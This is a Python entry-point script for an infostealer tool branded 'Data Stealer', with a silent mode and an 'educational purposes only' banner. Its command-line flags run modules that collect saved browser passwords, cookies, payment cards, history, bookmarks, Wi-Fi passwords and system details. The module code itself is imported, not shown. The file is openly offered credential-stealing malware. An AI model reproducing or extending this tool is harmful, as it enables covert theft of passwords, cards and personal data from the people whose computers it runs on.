import argparse


from config import Constant
from config import Colors

from modules import ChromiumStealer, WebHistoryStealer, WebBookmarksStealer # browser
from modules import NetworkInfoStealer, WifiPasswordStealer # network
from modules import SystemInfoStealer # system


def parser():
    parser = argparse.ArgumentParser(description="Data Stealer | Data Recovery Tool | Built by @hirusha-adi")
    parser.add_argument("--silent", "-s" , action="store_true", help="Silent Mode - No Console Output", default=False)
    parser.add_argument("--verbose", "-v" , action="store_true", help="Verbose - Display everything that happens", default=True)
    parser.add_argument("--log", "-l" , action="store_true", help="Log to file", default=True)
    
    parser.add_argument("--all", "-a" , action="store_true", help="Get All Information", default=True)
    
    parser.add_argument("--browser-all", "-ba" , action="store_true", help="Get Browser Passwords, Cookies, Cards and History and Bookmarks", default=False)
    parser.add_argument("--browser-passwords", "-bp" , action="store_true", help="Get Browser Passwords, Cookies, Cards and History DB File", default=False)
    parser.add_argument("--browser-history", "-bh" , action="store_true", help="Get Browser History", default=False)
    parser.add_argument("--browser-bookmakrs", "-bb" , action="store_true", help="Get Browser Bookmarks", default=False)
    
    parser.add_argument("--network-all", "-na" , action="store_true", help="Get All Network Information and Wifi Passwords", default=False)
    parser.add_argument("--network-wifi", "-nw" , action="store_true", help="Get Wifi Passwords", default=False)
    parser.add_argument("--network-info", "-ni" , action="store_true", help="Get All Network Information", default=False)
    
    parser.add_argument("--system-all", "-sa" , action="store_true", help="Get All Network Information and Wifi Passwords", default=False)
    
    args = parser.parse_args()
    
    Constant.Args.silent = args.silent
    Constant.Args.verbose = args.verbose
    Constant.Args.log = args.log
    
    Constant.Args.all = args.all 
    Constant.Args.browser_all = args.browser_all 
    Constant.Args.browser_passwords = args.browser_passwords 
    Constant.Args.browser_history = args.browser_history 
    Constant.Args.browser_bookmakrs = args.browser_bookmakrs 
    Constant.Args.network_all = args.network_all 
    Constant.Args.network_wifi = args.network_wifi 
    Constant.Args.network_info = args.network_info 
    Constant.Args.system_all = args.system_all
    
    if Constant.Args.browser_all:
        Constant.Args.browser_passwords = True
        Constant.Args.browser_history = True
        Constant.Args.browser_bookmakrs = True
    
    if Constant.Args.network_all:
        Constant.Args.network_wifi = True
        Constant.Args.network_info = True
    
    if Constant.Args.all:
        Constant.Args.browser_passwords = True
        Constant.Args.browser_history = True
        Constant.Args.browser_bookmakrs = True
        Constant.Args.network_wifi = True
        Constant.Args.network_info = True
        Constant.Args.system_all = True
    
    if Constant.Args.silent:
        Constant.Args.verbose = False
        Constant.Args.silent = False
        Constant.Args.log = False
    
    return args
    
def cexit():
    print(f"""
{Colors.GREEN}   __,_,
{Colors.GREEN}  [_|_/                {Colors.CYAN}   Made by {Colors.MAGENTA}{Colors.UNDERLINE}@hirusha-ad{Colors.RESET}
{Colors.GREEN}   //                  {Colors.CYAN} ------------------------
{Colors.GREEN} _//    __             {Colors.CYAN} 
{Colors.GREEN}(_|)   |@@|            {Colors.CYAN} Check out my other
{Colors.GREEN} \ \__ \--/ __         {Colors.CYAN} projects at Github
{Colors.GREEN}  \o__|----|  |   __   {Colors.CYAN} 
{Colors.GREEN}      \ () /\ )_ / _\  {Colors.CYAN} Email ->
{Colors.GREEN}      /\__/\ \__O (__  {Colors.CYAN}     {Colors.UNDERLINE}{Colors.MAGENTA}hirushaadi@gmail.com{Colors.RESET}
{Colors.GREEN}     (--/\--)    \__/  {Colors.CYAN}
{Colors.GREEN}     _)(  )(_          {Colors.CYAN} Discord ->
{Colors.GREEN}    `---''---`         {Colors.CYAN}     {Colors.UNDERLINE}{Colors.MAGENTA}hirushaadi#8626{Colors.RESET}
    
{Colors.GREY}---------------------------------------------------
    {Colors.RED}THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY
{Colors.GREY}---------------------------------------------------
          """)
    input(f"{Colors.MAGENTA}Press [ENTER] to Exit{Colors.RESET}")
    exit()

def main():
    """
    Order ->
        1) Browsers
            1. Passwords, Cookies, Cards and History DB (Web Data)
            2. History
            3. Bookmakrs
        2) Network
            1. Wifi Passwords
            2. Network Information
        3) System
            1. System Information 
                (including detailed hardware information)
    """
    parser()
    
    if Constant.Args.browser_passwords:
        ChromiumStealer().run()
    
    if Constant.Args.browser_history:
        WebHistoryStealer().run()
    
    if Constant.Args.browser_bookmakrs:
        WebBookmarksStealer().run()
    
    if Constant.Args.network_wifi:
        WifiPasswordStealer().run()
    
    if Constant.Args.network_info:
        NetworkInfoStealer().run()
    
    if Constant.Args.system_all:
        SystemInfoStealer().run()
    
    cexit()

if __name__ == "__main__":
    main()
    